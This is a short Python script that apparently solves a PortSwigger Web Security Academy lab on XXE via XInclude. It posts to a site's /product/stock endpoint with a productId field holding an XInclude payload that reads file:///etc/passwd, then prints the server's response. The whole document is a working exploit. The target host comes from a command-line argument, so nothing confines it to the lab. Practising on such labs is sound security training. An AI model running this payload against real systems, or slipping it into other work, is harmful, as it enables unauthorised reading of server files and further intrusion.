"""
https://portswigger.net/web-security/xxe/lab-xinclude-attack
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

stock_url = f'https://{site}/product/stock'
xml_dummy_data = { 'productId' : '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', 'storeId' : '1'}

resp = s.post(stock_url,data=xml_dummy_data)
print(resp.text)
